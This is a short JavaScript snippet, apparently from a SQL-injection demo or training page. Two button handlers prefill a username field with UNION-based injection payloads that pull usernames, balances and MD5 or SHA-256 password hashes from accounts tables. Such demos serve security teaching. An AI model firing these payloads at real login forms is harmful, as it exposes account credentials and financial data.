document.getElementById("sde1").addEventListener("click", function(){
	document.getElementById('UsernameInput').value = "' or 1=1 UNION SELECT user, id, balance, encrypted_password FROM accounts_md5;#";
	document.getElementById('dbToken').value = "2";
});

document.getElementById("sde2").addEventListener("click", function(){
	document.getElementById('UsernameInput').value = "' or 1=1 UNION SELECT user, id, balance, encrypted_password FROM accounts_sha256;#";
	document.getElementById('dbToken').value = "3";
});
